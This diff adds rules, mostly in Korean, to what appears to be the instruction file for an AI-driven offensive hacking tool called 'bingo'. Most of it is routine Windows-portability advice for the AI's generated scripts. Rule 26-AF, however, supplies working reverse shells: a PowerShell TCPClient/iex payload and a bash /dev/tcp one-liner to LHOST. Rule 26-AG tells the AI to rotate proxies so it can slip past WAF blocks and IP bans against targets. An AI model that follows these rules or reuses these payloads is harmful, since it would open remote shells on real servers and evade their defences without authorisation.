@@ -2696,6 +2696,110 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
       # 또는 단순히 concat 사용:
       url = base + "/search?q=" + requests.utils.quote(val + "'", safe='')
 
+  ── RULE 26-AC [v3.2.29]: python3 대신 반드시 sys.executable 사용 ──
+
+  ▸ RULE 26-AC [v3.2.29]: subprocess로 Python 인터프리터를 직접 실행할 때
+    "python3" 또는 "python" 문자열을 하드코딩하지 말라.
+    Windows에서는 python3 명령이 없어 FileNotFoundError가 발생한다.
+    반드시 sys.executable을 사용하라.
+
+    WRONG:
+      subprocess.run(["python3", "-c", "..."])
+      os.system("python3 script.py")
+      cmd = "python3 -c 'import ...' "
+
+    CORRECT:
+      import sys
+      subprocess.run([sys.executable, "-c", "..."])
+      subprocess.run([sys.executable, "script.py"])
+
+  ── RULE 26-AD [v3.2.29]: /tmp/ 경로 하드코딩 금지 — tempfile.gettempdir() 사용 ──
+
+  ▸ RULE 26-AD [v3.2.29]: 임시 파일 경로로 /tmp/ 를 절대 하드코딩하지 말라.
+    Windows에는 /tmp/ 가 없어 FileNotFoundError가 발생한다.
+    반드시 tempfile 모듈을 사용하라.
+
+    WRONG:
+      out_path = "/tmp/bingo_out.txt"
+      tmp_hash = Path("/tmp/bingo_hash.txt")
+      with open("/tmp/result.json", "w") as f: ...
+
+    CORRECT:
+      import tempfile, os
+      out_path = os.path.join(tempfile.gettempdir(), "bingo_out.txt")
+      tmp_hash = os.path.join(tempfile.gettempdir(), "bingo_hash.txt")
+
+  ── RULE 26-AE [v3.2.29]: chmod +x / apt-get / apt install 금지 ──
+
+  ▸ RULE 26-AE [v3.2.29]: AI 생성 스크립트 안에서 chmod, apt-get, apt install,
+    sudo apt 명령을 절대 사용하지 말라.
+    Windows에서는 이 명령들이 존재하지 않아 스크립트가 즉시 실패한다.
+
+    WRONG:
+      os.system("chmod +x /tmp/tool")
+      os.system("sudo apt install default-jdk-17")
+      subprocess.run(["apt-get", "install", "apktool"])
+
+    CORRECT:
+      # 툴 설치 없이 Python 표준 라이브러리 또는 이미 설치된 도구만 사용
+      # 플랫폼 조건 분기가 필요하다면:
+      import platform
+      if platform.system() != "Windows":
+          os.system("chmod +x /path/to/tool")
+
+  ── RULE 26-AF [v3.2.29]: Windows 타겟 리버스쉘 — PowerShell 사용 ──
+
+  ▸ RULE 26-AF [v3.2.29]: 타겟이 Windows 서버일 때 리버스쉘을 생성하려면
+    bash/nc/sh 기반 Linux 페이로드가 아닌 PowerShell 페이로드를 생성하라.
+    타겟 OS를 먼저 확인(Server header, 오류 메시지, ASP.NET 여부)한 뒤 선택하라.
+
+    Windows 타겟 리버스쉘 (PowerShell):
+      $c=New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);
+      $s=$c.GetStream();[byte[]]$b=0..65535|%{0};
+      while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+        $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
+        $r=(iex $d 2>&1 | Out-String);
+        $rb=[System.Text.Encoding]::ASCII.GetBytes($r+"# ");
+        $s.Write($rb,0,$rb.Length)
+      }
+
+    Linux 타겟 리버스쉘 (기존 유지):
+      bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+  ── RULE 26-AG [v3.2.29]: 프록시 인식 — AI가 프록시 체인을 반드시 인지하고 활용 ──
+
+  ▸ RULE 26-AG [v3.2.29]: bingo에는 프록시 관리 시스템이 내장되어 있다.
+    AI 생성 스크립트는 반드시 이 프록시를 인식하고 활용해야 한다.
+
+    프록시 활성 신호:
+    - bingo가 컨텍스트에 [PROXY_ACTIVE: <proxy_url>] 메시지를 주입한다
+    - [PROXY_ROTATED: <new_proxy_url>] = 프록시가 교체됨
+    - 이 신호가 없으면 프록시 미사용 상태
+
+    스크립트에서 프록시 사용하는 법:
+      # bingo가 주입한 프록시 URL을 환경변수로 전달
+      import os, requests
+      _proxy_url = os.environ.get("BINGO_PROXY", "")
+      PROXIES = {"http": _proxy_url, "https": _proxy_url} if _proxy_url else {}
+      r = requests.get(url, proxies=PROXIES, verify=False, timeout=15)
+
+    프록시 자동 선택 규칙:
+    1. [PROXY_ACTIVE] 주입 시 → 모든 HTTP 요청에 proxies= 필수
+    2. WAF 차단 / IP 밴 감지 시 → print("[🚫 IP_BLOCKED]...") 출력 후 스크립트 종료
+       (bingo가 자동으로 다음 프록시로 교체 후 재시작)
+    3. ReadTimeout 연속 3회 → IP 차단 가능성 높음 → [🚫 IP_BLOCKED] 출력 후 종료
+    4. 타겟이 특정 국가 IP 차단 시 → bingo에게 해당 국가 프록시 요청 안내 출력
+
+    WRONG — 프록시 무시:
+      r = requests.get(url)  # PROXY_ACTIVE 상태에서 직접 요청 금지
+
+    CORRECT — 항상 PROXIES 변수 초기화 후 사용:
+      _purl = os.environ.get("BINGO_PROXY", "")
+      PROXIES = {"http": _purl, "https": _purl} if _purl else {}
+      s = requests.Session()
+      s.proxies.update(PROXIES)
+      s.verify = False
+
   ── 27. SQLi Extraction & Oracle Quality ──
 
   ▸ RULE 27-A: EXTRACTVALUE / UPDATEXML result extraction — use the MySQL error format.
